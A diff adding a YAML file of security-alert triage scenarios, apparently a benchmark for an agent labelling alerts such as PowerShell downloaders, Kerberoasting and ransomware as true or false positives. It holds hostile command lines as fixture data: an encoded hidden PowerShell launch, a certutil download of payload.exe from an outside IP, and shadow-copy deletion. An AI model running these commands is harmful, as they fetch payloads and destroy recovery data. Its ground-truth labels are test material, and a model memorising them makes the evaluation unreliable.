@@ -1,0 +1,128 @@
+scenarios:
+  - id: SC-001
+    name: "Encoded PowerShell downloader"
+    weight: 12
+    severity: high
+    rule_name: "Suspicious PowerShell encoded command execution"
+    mitre: [{technique_id: "T1059.001", name: "PowerShell", tactic: "Execution"},
+            {technique_id: "T1027", name: "Obfuscated Files or Information", tactic: "Defense Evasion"}]
+    ground_truth: true_positive
+    process:
+      name: powershell.exe
+      parent_name: winword.exe
+      command_line: "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0..."
+    network: {destination_ip: "185.220.101.7", destination_port: 443, domain: "cdn-update-srv.xyz"}
+    notes: "Office parent -> PowerShell child = classic malicious document pattern"
+
+  - id: SC-002
+    name: "Impossible travel sign-in"
+    weight: 10
+    severity: medium
+    rule_name: "Impossible travel detected for user sign-in"
+    mitre: [{technique_id: "T1078", name: "Valid Accounts", tactic: "Initial Access"}]
+    ground_truth: benign_positive
+    user: {username: "m.dupont", is_privileged: false}
+    network: {source_ip: "51.15.43.220"}
+    notes: "Corporate VPN egress -> often benign. The agent should check the ASN."
+
+  - id: SC-003
+    name: "SSH brute force then success"
+    weight: 10
+    severity: high
+    rule_name: "Multiple failed SSH logins followed by success"
+    mitre: [{technique_id: "T1110.001", name: "Password Guessing", tactic: "Credential Access"}]
+    ground_truth: true_positive
+    network: {source_ip: "45.83.12.9", destination_port: 22, protocol: tcp}
+    user: {username: "root", is_privileged: true}
+
+  - id: SC-004
+    name: "Ransomware mass file encryption"
+    weight: 6
+    severity: critical
+    rule_name: "Mass file modification with high entropy - possible ransomware"
+    mitre: [{technique_id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact"},
+            {technique_id: "T1490", name: "Inhibit System Recovery", tactic: "Impact"}]
+    ground_truth: true_positive
+    process: {name: "svchost.exe", command_line: "vssadmin delete shadows /all /quiet"}
+    host: {criticality: crown_jewel}
+
+  - id: SC-005
+    name: "EICAR test file"
+    weight: 8
+    severity: medium
+    rule_name: "Antivirus detected EICAR test signature"
+    mitre: []
+    ground_truth: false_positive
+    process: {hash_sha256: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"}
+    notes: "EICAR is a harmless AV test file. The system MUST recognise it as a FP."
+
+  - id: SC-006
+    name: "LOLBin certutil download"
+    weight: 8
+    severity: high
+    rule_name: "Living-off-the-land binary used to download remote payload"
+    mitre: [{technique_id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control"},
+            {technique_id: "T1218", name: "System Binary Proxy Execution", tactic: "Defense Evasion"}]
+    ground_truth: true_positive
+    process:
+      name: certutil.exe
+      command_line: "certutil.exe -urlcache -split -f http://194.87.111.4/payload.exe C:\\Users\\Public\\p.exe"
+
+  - id: SC-007
+    name: "Backup agent triggering file-read alert"
+    weight: 10
+    severity: low
+    rule_name: "High volume of file reads by non-interactive process"
+    mitre: []
+    ground_truth: false_positive
+    user: {username: "svc_backup", is_service_account: true}
+    process: {name: "veeamagent", command_line: "/opt/veeam/veeamagent --job nightly"}
+    notes: "Known service account. Tests the ability to use a baseline."
+
+  - id: SC-008
+    name: "Kerberoasting"
+    weight: 6
+    severity: high
+    rule_name: "Multiple Kerberos service ticket requests with RC4 encryption"
+    mitre: [{technique_id: "T1558.003", name: "Kerberoasting", tactic: "Credential Access"}]
+    ground_truth: true_positive
+    user: {username: "j.martin", is_privileged: false}
+
+  - id: SC-009
+    name: "DNS tunneling / beaconing"
+    weight: 7
+    severity: high
+    rule_name: "Anomalous DNS query volume with long subdomains"
+    mitre: [{technique_id: "T1071.004", name: "DNS", tactic: "Command and Control"}]
+    ground_truth: true_positive
+    network: {domain: "a3f9b2c1d8e7.tunnel-dns.top", destination_port: 53, protocol: udp}
+
+  - id: SC-010
+    name: "Cloud storage exfiltration"
+    weight: 7
+    severity: high
+    rule_name: "Large outbound data transfer to personal cloud storage"
+    mitre: [{technique_id: "T1567.002", name: "Exfiltration to Cloud Storage", tactic: "Exfiltration"}]
+    ground_truth: true_positive
+    network: {domain: "mega.nz", destination_port: 443, bytes_out: 4831838208}
+    user: {username: "s.leroy", department: "R&D"}
+
+  - id: SC-011
+    name: "Vulnerability scanner from internal subnet"
+    weight: 8
+    severity: medium
+    rule_name: "Port scan detected from internal host"
+    mitre: [{technique_id: "T1046", name: "Network Service Discovery", tactic: "Discovery"}]
+    ground_truth: benign_positive
+    network: {source_ip: "10.10.5.44", destination_port: 445}
+    notes: "Authorised Nessus scanner. Must be recognised via the allowlist."
+
+  - id: SC-012
+    name: "Web shell dropped on server"
+    weight: 8
+    severity: critical
+    rule_name: "New executable file created in web root directory"
+    mitre: [{technique_id: "T1505.003", name: "Web Shell", tactic: "Persistence"}]
+    ground_truth: true_positive
+    host: {criticality: high}
+    process: {name: "w3wp.exe", command_line: "cmd.exe /c whoami"}
